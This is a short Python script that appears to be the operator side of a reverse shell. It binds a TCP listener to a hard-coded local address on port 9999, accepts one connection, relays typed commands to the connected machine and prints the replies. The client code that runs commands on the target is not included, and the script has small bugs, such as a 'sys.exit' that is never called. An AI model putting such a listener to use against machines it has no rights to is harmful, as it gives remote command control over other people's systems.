import socket
import sys


def create_socket():
    try:
        global host
        global port
        global a
        host = "192.168.43.196"
        port = 9999
        a = socket.socket()

    except socket.error as msg:
        print("Socket creation error: "+str(msg))


def bind_socket():
    try:
        global host
        global port
        global a

        print("Binding the port " + str(port))
        a.bind((host, port))
        a.listen(10)

    except socket.error as msg:
        print("Socket binding error "+str(msg))
        bind_socket()

#establish connection

def socket_accept():
    conn,address = a.accept()
    print("Connection has been established: " +" IP " + address[0]+ " ; Port "+ str(address[1]))
    send_commands(conn)
    conn.close()

#send commands
def send_commands(conn):
    print("You are in func")
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            a.close()
            sys.exit
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response,end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()

main()
